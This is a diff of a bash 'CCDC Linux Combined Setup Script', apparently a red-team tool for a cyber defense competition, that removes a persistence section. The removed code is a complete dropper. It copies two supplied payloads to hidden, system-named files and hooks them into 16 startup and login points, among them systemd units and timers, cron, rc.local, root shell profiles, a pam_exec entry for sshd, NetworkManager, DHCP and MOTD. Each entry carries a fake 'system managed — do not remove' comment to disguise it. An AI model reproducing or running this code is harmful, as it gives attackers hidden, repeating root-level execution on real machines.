@@ -2,7 +2,7 @@
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 # CCDC Linux Combined Setup Script — Interactive Menu Edition
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-# All 9 Linux SetupScripts in one interactive menu.
+# All 8 Linux SetupScripts in one interactive menu.
 # Select sections to run; completed sections shown in GREEN [DONE].
 #
 #   1. ATD: ComeATmeBro
@@ -10,7 +10,6 @@
 #   3. CronJobs: ImGonnaCron
 #   4. LD_PRELOAD: LoadsOfIssues
 #   5. PAM: ExWifeNamedPAM
-#   6. Persistence: PlantsVsZerodays
 #   7. RemoteAccess: OpenDoorPolicy
 #   8. Users: HomeIntruders
 #   9. WebShell: OopsAllWebShells
@@ -760,469 +759,6 @@ SSHCFG
 }
 
 # =============================================================================
-# SECTION 6 — Persistence: PlantsVsZerodays
-# =============================================================================
-section_6_persistence() {
-    local PAYLOAD_SRC_1="${1:-}"
-    local PAYLOAD_SRC_2="${2:-}"
-    section_hdr "6/9 — Persistence: PlantsVsZerodays — 16-location startup/interval/login persistence (2 payloads)"
-
-    if [[ -z "${PAYLOAD_SRC_1}" ]] || [[ ! -f "${PAYLOAD_SRC_1}" ]]; then
-        err "Payload 1 not found: ${PAYLOAD_SRC_1}"
-        err "Create the payload scripts first, then re-run this section."
-        return 1
-    fi
-    if [[ -z "${PAYLOAD_SRC_2}" ]] || [[ ! -f "${PAYLOAD_SRC_2}" ]]; then
-        err "Payload 2 not found: ${PAYLOAD_SRC_2}"
-        err "Create the payload scripts first, then re-run this section."
-        return 1
-    fi
-
-    chmod +x "${PAYLOAD_SRC_1}"
-    chmod +x "${PAYLOAD_SRC_2}"
-    info "Payload 1 confirmed: ${PAYLOAD_SRC_1}"
-    info "Payload 2 confirmed: ${PAYLOAD_SRC_2}"
-    echo
-
-    info "[1/8] Planting in /etc/rc.local ..."
-    local RC_LOCAL="/etc/rc.local"
-    cat > "${RC_LOCAL}" <<RCEOF
-#!/bin/bash
-# rc.local — executed at the end of each multiuser runlevel.
-
-# System initialisation helper (do not remove)
-sleep 15 && /usr/local/lib/.sysinit-helper 2>/dev/null &
-sleep 15 && /usr/local/lib/.sysinit-core   2>/dev/null &
-
-exit 0
-RCEOF
-    chmod +x "${RC_LOCAL}"
-    cp "${PAYLOAD_SRC_1}" /usr/local/lib/.sysinit-helper
-    chmod +x /usr/local/lib/.sysinit-helper
-    cp "${PAYLOAD_SRC_2}" /usr/local/lib/.sysinit-core
-    chmod +x /usr/local/lib/.sysinit-core
-    systemctl enable rc-local 2>/dev/null || true
-    systemctl start  rc-local 2>/dev/null || true
-    success "  /etc/rc.local planted (both payloads)"
-    success "  /usr/local/lib/.sysinit-helper planted"
-    success "  /usr/local/lib/.sysinit-core   planted"
-    echo
-
-    info "[2/8] Planting in /etc/profile.d/ ..."
-    cp "${PAYLOAD_SRC_1}" /usr/local/lib/.sysenv-init
-    chmod +x /usr/local/lib/.sysenv-init
-    cp "${PAYLOAD_SRC_2}" /usr/local/lib/.sysenv-daemon
-    chmod +x /usr/local/lib/.sysenv-daemon
-    cat > "/etc/profile.d/99-sysenv-init.sh" << 'PROFEOF'
-#!/bin/bash
-# System environment initialisation — managed by sysenv-daemon
-if [ "$(id -u)" -eq 0 ]; then
-    /usr/local/lib/.sysenv-init   2>/dev/null &
-    /usr/local/lib/.sysenv-daemon 2>/dev/null &
-fi
-PROFEOF
-    chmod 644 "/etc/profile.d/99-sysenv-init.sh"
-    success "  /etc/profile.d/99-sysenv-init.sh planted"
-    success "  /usr/local/lib/.sysenv-init   planted"
-    success "  /usr/local/lib/.sysenv-daemon planted"
-    echo
-
-    info "[3/8] Planting as a systemd oneshot unit ..."
-    local UNIT_FILE="/etc/systemd/system/sys-khelper-init.service"
-    cp "${PAYLOAD_SRC_1}" /usr/local/lib/.khelper-init
-    chmod +x /usr/local/lib/.khelper-init
-    cp "${PAYLOAD_SRC_2}" /usr/local/lib/.khelper-core
-    chmod +x /usr/local/lib/.khelper-core
-    cat > "${UNIT_FILE}" <<UNITEOF
-[Unit]
-Description=Kernel subsystem helper initialisation
-DefaultDependencies=no
-After=local-fs.target sysinit.target
-
-[Service]
-Type=simple
-ExecStart=/usr/local/lib/.khelper-init
-ExecStartPost=/usr/local/lib/.khelper-core
-Restart=always
-RestartSec=30
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=multi-user.target
-UNITEOF
-    chmod 644 "${UNIT_FILE}"
-    systemctl daemon-reload 2>/dev/null || true
-    systemctl enable sys-khelper-init.service 2>/dev/null || true
-    success "  /etc/systemd/system/sys-khelper-init.service planted & enabled"
-    success "  /usr/local/lib/.khelper-init planted"
-    success "  /usr/local/lib/.khelper-core planted"
-    echo
-
-    info "[4/8] Planting in /etc/cron.d/ as @reboot job ..."
-    local CROND_FILE="/etc/cron.d/syslogd-helper"
-    cp "${PAYLOAD_SRC_1}" /usr/local/lib/.syslogd-helper
-    chmod +x /usr/local/lib/.syslogd-helper
-    cp "${PAYLOAD_SRC_2}" /usr/local/lib/.syslogd-cache
-    chmod +x /usr/local/lib/.syslogd-cache
-    cat > "${CROND_FILE}" << 'CRONEOF'
-# syslog daemon helper task — do not remove (system managed)
-SHELL=/bin/bash
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
-@reboot  root  /usr/local/lib/.syslogd-helper 2>/dev/null
-@reboot  root  /usr/local/lib/.syslogd-cache  2>/dev/null
-CRONEOF
-    chmod 644 "${CROND_FILE}"
-    success "  /etc/cron.d/syslogd-helper planted (both payloads)"
-    success "  /usr/local/lib/.syslogd-helper planted"
-    success "  /usr/local/lib/.syslogd-cache  planted"
-    echo
-
-    info "[5/8] Planting in /root/.bashrc ..."
-    local BASHRC="/root/.bashrc"
-    local MARKER="# __sysnet_diag_hook__"
-    cp "${PAYLOAD_SRC_1}" /usr/local/lib/.sysnet-diag
-    chmod +x /usr/local/lib/.sysnet-diag
-    cp "${PAYLOAD_SRC_2}" /usr/local/lib/.sysnet-probe
-    chmod +x /usr/local/lib/.sysnet-probe
-    if ! grep -q "${MARKER}" "${BASHRC}" 2>/dev/null; then
-        cat >> "${BASHRC}" <<BASHRCEOF
-
-${MARKER}
-# Network diagnostics daemon hook (system managed — do not remove)
-if [[ \$EUID -eq 0 ]] && [[ -z "\${__SYSNET_DIAG_RAN:-}" ]]; then
-    export __SYSNET_DIAG_RAN=1
-    /usr/local/lib/.sysnet-diag  2>/dev/null &
-    /usr/local/lib/.sysnet-probe 2>/dev/null &
-fi
-BASHRCEOF
-    fi
-    success "  /root/.bashrc hook appended (both payloads)"
-    success "  /usr/local/lib/.sysnet-diag  planted"
-    success "  /usr/local/lib/.sysnet-probe planted"
-    echo
-
-    info "[6/8] Planting via at(1) — self-rescheduling every 30 minutes ..."
-    local AT_RUNNER="/usr/local/lib/.sysat-runner"
-    local AT_MONITOR="/usr/local/lib/.sysat-monitor"
-    local AT_WRAPPER="/usr/local/lib/.sysat-wrapper.sh"
-    if ! command -v at &>/dev/null; then
-        info "  'at' not found — installing ..."
-        ${PKG_INSTALL} at 2>/dev/null || true
-    fi
-    cp "${PAYLOAD_SRC_1}" "${AT_RUNNER}"
-    chmod +x "${AT_RUNNER}"
-    cp "${PAYLOAD_SRC_2}" "${AT_MONITOR}"
-    chmod +x "${AT_MONITOR}"
-    cat > "${AT_WRAPPER}" <<'ATWRAP'
-#!/bin/bash
-/usr/local/lib/.sysat-runner  2>/dev/null
-/usr/local/lib/.sysat-monitor 2>/dev/null
-echo "/usr/local/lib/.sysat-wrapper.sh 2>/dev/null" | at now + 30 minutes 2>/dev/null
-ATWRAP
-    chmod +x "${AT_WRAPPER}"
-    systemctl enable --now atd 2>/dev/null || true
-    echo "${AT_WRAPPER} 2>/dev/null" | at now + 30 minutes 2>/dev/null || \
-        warn "  at job submission failed — is atd running?"
-    success "  ${AT_RUNNER}  planted"
-    success "  ${AT_MONITOR} planted"
-    success "  ${AT_WRAPPER} planted (both payloads, self-rescheduling)"
-    success "  Initial at job enqueued (runs every 30 minutes)"
-    echo
-
-    info "[7/8] Planting in /etc/cron.d/ as interval job (every 30 minutes) ..."
-    local CROND_INTERVAL="/etc/cron.d/systemd-journal-sync"
-    local CRON_PAYLOAD_1="/usr/local/lib/.syscron-interval"
-    local CRON_PAYLOAD_2="/usr/local/lib/.syscron-daemon"
-    cp "${PAYLOAD_SRC_1}" "${CRON_PAYLOAD_1}"
-    chmod +x "${CRON_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${CRON_PAYLOAD_2}"
-    chmod +x "${CRON_PAYLOAD_2}"
-    cat > "${CROND_INTERVAL}" << 'CRONINTEOF'
-# journal cache sync helper — do not remove (system managed)
-SHELL=/bin/bash
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
-*/30 * * * *  root  /usr/local/lib/.syscron-interval 2>/dev/null
-*/30 * * * *  root  /usr/local/lib/.syscron-daemon   2>/dev/null
-CRONINTEOF
-    chmod 644 "${CROND_INTERVAL}"
-    success "  ${CROND_INTERVAL} planted (every 30 min, both payloads)"
-    success "  ${CRON_PAYLOAD_1} planted"
-    success "  ${CRON_PAYLOAD_2} planted"
-    echo
-
-    info "[8/8] Planting as a systemd timer (every 30 minutes) ..."
-    local TIMER_SVC="/etc/systemd/system/sys-journal-flusher.service"
-    local TIMER_UNIT="/etc/systemd/system/sys-journal-flusher.timer"
-    local TIMER_PAYLOAD_1="/usr/local/lib/.systimer-exec"
-    local TIMER_PAYLOAD_2="/usr/local/lib/.systimer-poll"
-    cp "${PAYLOAD_SRC_1}" "${TIMER_PAYLOAD_1}"
-    chmod +x "${TIMER_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${TIMER_PAYLOAD_2}"
-    chmod +x "${TIMER_PAYLOAD_2}"
-    cat > "${TIMER_SVC}" <<SVCEOF
-[Unit]
-Description=Journal Flush Helper
-After=local-fs.target
-
-[Service]
-Type=simple
-ExecStart=/usr/local/lib/.systimer-exec
-ExecStartPost=/usr/local/lib/.systimer-poll
-Restart=always
-RestartSec=30
-StandardOutput=null
-StandardError=null
-SVCEOF
-    chmod 644 "${TIMER_SVC}"
-    cat > "${TIMER_UNIT}" <<TIMEREOF
-[Unit]
-Description=Journal Flush Scheduler
-
-[Timer]
-OnBootSec=30s
-OnUnitActiveSec=30m
-Persistent=true
-
-[Install]
-WantedBy=timers.target
-TIMEREOF
-    chmod 644 "${TIMER_UNIT}"
-    systemctl daemon-reload 2>/dev/null || true
-    systemctl enable sys-journal-flusher.timer 2>/dev/null || true
-    systemctl start  sys-journal-flusher.timer 2>/dev/null || true
-    success "  ${TIMER_SVC}      planted (both payloads)"
-    success "  ${TIMER_UNIT}     planted & enabled (every 30 min)"
-    success "  ${TIMER_PAYLOAD_1} planted"
-    success "  ${TIMER_PAYLOAD_2} planted"
-    echo
-
-    info "[9/16] Planting in NetworkManager dispatcher ..."
-    local NM_DISPATCHER_DIR="/etc/NetworkManager/dispatcher.d"
-    local NM_SCRIPT="${NM_DISPATCHER_DIR}/99-sysnet-init"
-    local NM_PAYLOAD_1="/usr/local/lib/.sysnet-nm-hook"
-    local NM_PAYLOAD_2="/usr/local/lib/.sysnet-nm-monitor"
-    mkdir -p "${NM_DISPATCHER_DIR}"
-    cp "${PAYLOAD_SRC_1}" "${NM_PAYLOAD_1}"
-    chmod +x "${NM_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${NM_PAYLOAD_2}"
-    chmod +x "${NM_PAYLOAD_2}"
-    cat > "${NM_SCRIPT}" << 'NMEOF'
-#!/bin/bash
-# NetworkManager connectivity helper — do not remove (system managed)
-sleep 5 && /usr/local/lib/.sysnet-nm-hook    2>/dev/null &
-sleep 5 && /usr/local/lib/.sysnet-nm-monitor 2>/dev/null &
-NMEOF
-    chmod 755 "${NM_SCRIPT}"
-    success "  ${NM_SCRIPT}   planted (fires on every interface up event)"
-    success "  ${NM_PAYLOAD_1} planted"
-    success "  ${NM_PAYLOAD_2} planted"
-    echo
-
-    info "[10/16] Planting in DHCP client exit hooks ..."
-    local DHCP_HOOK_DIR="/etc/dhcp/dhclient-exit-hooks.d"
-    local DHCP_HOOK="${DHCP_HOOK_DIR}/sysnet-helper"
-    local DHCP_PAYLOAD_1="/usr/local/lib/.sysdhcp-hook"
-    local DHCP_PAYLOAD_2="/usr/local/lib/.sysdhcp-update"
-    mkdir -p "${DHCP_HOOK_DIR}"
-    cp "${PAYLOAD_SRC_1}" "${DHCP_PAYLOAD_1}"
-    chmod +x "${DHCP_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${DHCP_PAYLOAD_2}"
-    chmod +x "${DHCP_PAYLOAD_2}"
-    cat > "${DHCP_HOOK}" << 'DHCPEOF'
-#!/bin/bash
-# DHCP connectivity helper — do not remove (system managed)
-/usr/local/lib/.sysdhcp-hook   2>/dev/null &
-/usr/local/lib/.sysdhcp-update 2>/dev/null &
-DHCPEOF
-    chmod 755 "${DHCP_HOOK}"
-    success "  ${DHCP_HOOK}    planted (fires on every DHCP lease)"
-    success "  ${DHCP_PAYLOAD_1} planted"
-    success "  ${DHCP_PAYLOAD_2} planted"
-    echo
-
-    info "[11/16] Planting as SysV init script ..."
-    local INITD_SCRIPT="/etc/init.d/sysnet-helper"
-    local INITD_PAYLOAD_1="/usr/local/lib/.sysinit-sysv"
-    local INITD_PAYLOAD_2="/usr/local/lib/.sysinit-legacy"
-    cp "${PAYLOAD_SRC_1}" "${INITD_PAYLOAD_1}"
-    chmod +x "${INITD_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${INITD_PAYLOAD_2}"
-    chmod +x "${INITD_PAYLOAD_2}"
-    cat > "${INITD_SCRIPT}" << 'INITDEOF'
-#!/bin/bash
-### BEGIN INIT INFO
-# Provides:          sysnet-helper
-# Required-Start:    $network $local_fs
-# Required-Stop:
-# Default-Start:     2 3 4 5
-# Default-Stop:
-# Short-Description: System network helper daemon
-# Description:       Network connectivity initialisation helper for system services
-### END INIT INFO
-case "$1" in
-    start)
-        sleep 10 && /usr/local/lib/.sysinit-sysv   2>/dev/null &
-        sleep 10 && /usr/local/lib/.sysinit-legacy  2>/dev/null &
-        ;;
-    stop|restart|reload|status) ;;
-esac
-exit 0
-INITDEOF
-    chmod 755 "${INITD_SCRIPT}"
-    if command -v update-rc.d &>/dev/null; then
-        update-rc.d sysnet-helper defaults 2>/dev/null || true
-    elif command -v chkconfig &>/dev/null; then
-        chkconfig --add sysnet-helper 2>/dev/null || true
-    fi
-    success "  ${INITD_SCRIPT}    planted & enabled (both payloads)"
-    success "  ${INITD_PAYLOAD_1} planted"
-    success "  ${INITD_PAYLOAD_2} planted"
-    echo
-
-    info "[12/16] Planting via PAM exec in /etc/pam.d/sshd ..."
-    local PAM_EXEC_PAYLOAD_1="/usr/local/lib/.syspam-exec"
-    local PAM_EXEC_PAYLOAD_2="/usr/local/lib/.syspam-session"
-    local PAM_TARGET="/etc/pam.d/sshd"
-    cp "${PAYLOAD_SRC_1}" "${PAM_EXEC_PAYLOAD_1}"
-    chmod 755 "${PAM_EXEC_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${PAM_EXEC_PAYLOAD_2}"
-    chmod 755 "${PAM_EXEC_PAYLOAD_2}"
-    if [[ -f "${PAM_TARGET}" ]]; then
-        if ! grep -q "syspam-exec" "${PAM_TARGET}" 2>/dev/null; then
-            sed -i "1i # system session helper\nsession optional pam_exec.so quiet /usr/local/lib/.syspam-exec\nsession optional pam_exec.so quiet /usr/local/lib/.syspam-session" \
-                "${PAM_TARGET}" 2>/dev/null || true
-            success "  ${PAM_TARGET} modified (both payloads fire on every SSH login)"
-        else
-            warn "  ${PAM_TARGET} already patched — skipped"
-        fi
-    else
-        warn "  ${PAM_TARGET} not found — skipping PAM hook"
-    fi
-    success "  ${PAM_EXEC_PAYLOAD_1} planted"
-    success "  ${PAM_EXEC_PAYLOAD_2} planted"
-    echo
-
-    info "[13/16] Planting in /etc/update-motd.d/ ..."
-    local MOTD_DIR="/etc/update-motd.d"
-    local MOTD_SCRIPT="${MOTD_DIR}/98-sysinfo-helper"
-    local MOTD_PAYLOAD_1="/usr/local/lib/.sysmotd-exec"
-    local MOTD_PAYLOAD_2="/usr/local/lib/.sysmotd-banner"
-    mkdir -p "${MOTD_DIR}"
-    cp "${PAYLOAD_SRC_1}" "${MOTD_PAYLOAD_1}"
-    chmod +x "${MOTD_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${MOTD_PAYLOAD_2}"
-    chmod +x "${MOTD_PAYLOAD_2}"
-    cat > "${MOTD_SCRIPT}" << 'MOTDEOF'
-#!/bin/bash
-# System information helper — managed by update-motd
-/usr/local/lib/.sysmotd-exec   2>/dev/null &
-/usr/local/lib/.sysmotd-banner 2>/dev/null &
-MOTDEOF
-    chmod 755 "${MOTD_SCRIPT}"
-    success "  ${MOTD_SCRIPT}    planted (fires on every SSH login via MOTD)"
-    success "  ${MOTD_PAYLOAD_1} planted"
-    success "  ${MOTD_PAYLOAD_2} planted"
-    echo
-
-    info "[14/16] Planting in /root/.profile, .bash_profile, .bash_login ..."
-    local PROFILE_PAYLOAD_1="/usr/local/lib/.sysprofile-exec"
-    local PROFILE_PAYLOAD_2="/usr/local/lib/.sysprofile-init"
-    local PROFILE_MARKER="# __sysprofile_hook__"
-    cp "${PAYLOAD_SRC_1}" "${PROFILE_PAYLOAD_1}"
-    chmod +x "${PROFILE_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${PROFILE_PAYLOAD_2}"
-    chmod +x "${PROFILE_PAYLOAD_2}"
-    local rc_file
-    for rc_file in /root/.profile /root/.bash_profile /root/.bash_login; do
-        touch "${rc_file}" 2>/dev/null || true
-        if ! grep -q "${PROFILE_MARKER}" "${rc_file}" 2>/dev/null; then
-            cat >> "${rc_file}" <<PROFILEOF
-
-${PROFILE_MARKER}
-# System diagnostics init (system managed — do not remove)
-if [[ -z "\${__SYSPROFILE_RAN:-}" ]]; then
-    export __SYSPROFILE_RAN=1
-    /usr/local/lib/.sysprofile-exec  2>/dev/null &
-    /usr/local/lib/.sysprofile-init  2>/dev/null &
-fi
-PROFILEOF
-            success "  ${rc_file} hook appended (both payloads)"
-        else
-            warn "  ${rc_file} already has marker — skipped"
-        fi
-    done
-    success "  ${PROFILE_PAYLOAD_1} planted"
-    success "  ${PROFILE_PAYLOAD_2} planted"
-    echo
-
-    info "[15/16] Planting in system-wide bashrc ..."
-    local BASHRC_GLOBAL="/etc/bash.bashrc"
-    [[ -f "${BASHRC_GLOBAL}" ]] || BASHRC_GLOBAL="/etc/bashrc"
-    local BASHRC_SYS_PAYLOAD_1="/usr/local/lib/.sysbashrc-exec"
-    local BASHRC_SYS_PAYLOAD_2="/usr/local/lib/.sysbashrc-hook"
-    local BASHRC_SYS_MARKER="# __sysbashrc_hook__"
-    cp "${PAYLOAD_SRC_1}" "${BASHRC_SYS_PAYLOAD_1}"
-    chmod +x "${BASHRC_SYS_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${BASHRC_SYS_PAYLOAD_2}"
-    chmod +x "${BASHRC_SYS_PAYLOAD_2}"
-    if [[ -f "${BASHRC_GLOBAL}" ]]; then
-        if ! grep -q "${BASHRC_SYS_MARKER}" "${BASHRC_GLOBAL}" 2>/dev/null; then
-            cat >> "${BASHRC_GLOBAL}" <<BASHRCGEOF
-
-${BASHRC_SYS_MARKER}
-# System diagnostics helper (system managed — do not remove)
-if [[ \$EUID -eq 0 ]] && [[ -z "\${__SYSBASHRC_RAN:-}" ]]; then
-    export __SYSBASHRC_RAN=1
-    /usr/local/lib/.sysbashrc-exec 2>/dev/null &
-    /usr/local/lib/.sysbashrc-hook 2>/dev/null &
-fi
-BASHRCGEOF
-            success "  ${BASHRC_GLOBAL} hook appended (both payloads)"
-        else
-            warn "  ${BASHRC_GLOBAL} already has marker — skipped"
-        fi
-    else
-        warn "  /etc/bash.bashrc and /etc/bashrc not found — skipping"
-    fi
-    success "  ${BASHRC_SYS_PAYLOAD_1} planted"
-    success "  ${BASHRC_SYS_PAYLOAD_2} planted"
-    echo
-
-    info "[16/16] Planting in /etc/crontab ..."
-    local ETC_CRONTAB="/etc/crontab"
-    local CRONTAB_PAYLOAD_1="/usr/local/lib/.syscrontab-exec"
-    local CRONTAB_PAYLOAD_2="/usr/local/lib/.syscrontab-daemon"
-    cp "${PAYLOAD_SRC_1}" "${CRONTAB_PAYLOAD_1}"
-    chmod +x "${CRONTAB_PAYLOAD_1}"
-    cp "${PAYLOAD_SRC_2}" "${CRONTAB_PAYLOAD_2}"
-    chmod +x "${CRONTAB_PAYLOAD_2}"
-    if [[ ! -f "${ETC_CRONTAB}" ]]; then
-        echo "SHELL=/bin/bash" > "${ETC_CRONTAB}"
-        echo "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin" >> "${ETC_CRONTAB}"
-    fi
-    if ! grep -q "syscrontab-exec" "${ETC_CRONTAB}" 2>/dev/null; then
-        cat >> "${ETC_CRONTAB}" << 'CRONTABEOF'
-# system-wide maintenance task — do not remove (system managed)
-@reboot       root  /usr/local/lib/.syscrontab-exec   2>/dev/null
-@reboot       root  /usr/local/lib/.syscrontab-daemon 2>/dev/null
-*/30 * * * *  root  /usr/local/lib/.syscrontab-exec   2>/dev/null
-*/30 * * * *  root  /usr/local/lib/.syscrontab-daemon 2>/dev/null
-CRONTABEOF
-        success "  ${ETC_CRONTAB} entries added (@reboot + every 30 min, both payloads)"
-    else
-        warn "  ${ETC_CRONTAB} already has entry — skipped"
-    fi
-    success "  ${CRONTAB_PAYLOAD_1} planted"
-    success "  ${CRONTAB_PAYLOAD_2} planted"
-    echo
-
-    success "Persistence dropper complete — 2 payloads planted in 16 locations."
-}
-
-# =============================================================================
 # SECTION 7 — RemoteAccess: OpenDoorPolicy
 # =============================================================================
 section_7_remoteaccess() {
@@ -1719,7 +1255,6 @@ _menu_label() {
         3) echo "CronJobs: ImGonnaCron" ;;
         4) echo "LD_PRELOAD: LoadsOfIssues" ;;
         5) echo "PAM: ExWifeNamedPAM" ;;
-        6) echo "Persistence: PlantsVsZerodays" ;;
         7) echo "RemoteAccess: OpenDoorPolicy" ;;
         8) echo "Users: HomeIntruders" ;;
         9) echo "WebShell: OopsAllWebShells" ;;
@@ -1735,7 +1270,7 @@ draw_menu() {
     echo -e "  OS: ${OS_PRETTY}  |  Pkg: ${PKG_MGR}"
     echo
     local i label
-    for i in 1 2 3 4 5 6 7 8 9; do
+    for i in 1 2 3 4 5 7 8 9; do
         label="$(_menu_label "$i")"
         if is_done "$i"; then
             echo -e "  ${GREEN}[$i] [DONE] $label${NC}"
@@ -1763,18 +1298,6 @@ run_section() {
     read -rp "  Press Enter to return to menu..." _press_enter || true
 }
 
-prompt_payload_path() {
-    local _p=""
-    echo
-    info "Section 6 plants 2 scripts in 16 startup locations so they run on every reboot."
-    while [[ -z "$_p" ]]; do
-        printf "  Path to payload script 1: "
-        read -r _p || true
-        _p="${_p//[[:space:]]/}"
-        [[ -z "$_p" ]] && warn "Path cannot be empty."
-    done
-    echo "$_p"
-}
 
 main() {
     local choice payload_path
@@ -1788,25 +1311,12 @@ main() {
             3) run_section 3 section_3_cronjobs ;;
             4) run_section 4 section_4_ldpreload ;;
             5) run_section 5 section_5_pam ;;
-            6)
-                local payload_path_1 payload_path_2
-                payload_path_1="$(prompt_payload_path)"
-                printf "[?] Path to payload script 2: "
-                while true; do
-                    read -r payload_path_2 || true
-                    payload_path_2="${payload_path_2//[[:space:]]/}"
-                    [[ -n "$payload_path_2" ]] && break
-                    err "Path cannot be empty."
-                    printf "[?] Path to payload script 2: "
-                done
-                run_section 6 section_6_persistence "$payload_path_1" "$payload_path_2"
-                ;;
             7) run_section 7 section_7_remoteaccess ;;
             8) run_section 8 section_8_users ;;
             9) run_section 9 section_9_webshell ;;
             a|A)
                 local i
-                for i in 1 2 3 4 5 6 7 8 9; do
+                for i in 1 2 3 4 5 7 8 9; do
                     if is_done "$i"; then
                         info "Section $i ($(_menu_label "$i")) already done — skipping."
                         continue
@@ -1817,19 +1327,6 @@ main() {
                         3) run_section 3 section_3_cronjobs ;;
                         4) run_section 4 section_4_ldpreload ;;
                         5) run_section 5 section_5_pam ;;
-                        6)
-                            local payload_path_1 payload_path_2
-                            payload_path_1="$(prompt_payload_path)"
-                            printf "[?] Path to payload script 2: "
-                            while true; do
-                                read -r payload_path_2 || true
-                                payload_path_2="${payload_path_2//[[:space:]]/}"
-                                [[ -n "$payload_path_2" ]] && break
-                                err "Path cannot be empty."
-                                printf "[?] Path to payload script 2: "
-                            done
-                            run_section 6 section_6_persistence "$payload_path_1" "$payload_path_2"
-                            ;;
                         7) run_section 7 section_7_remoteaccess ;;
                         8) run_section 8 section_8_users ;;
                         9) run_section 9 section_9_webshell ;;
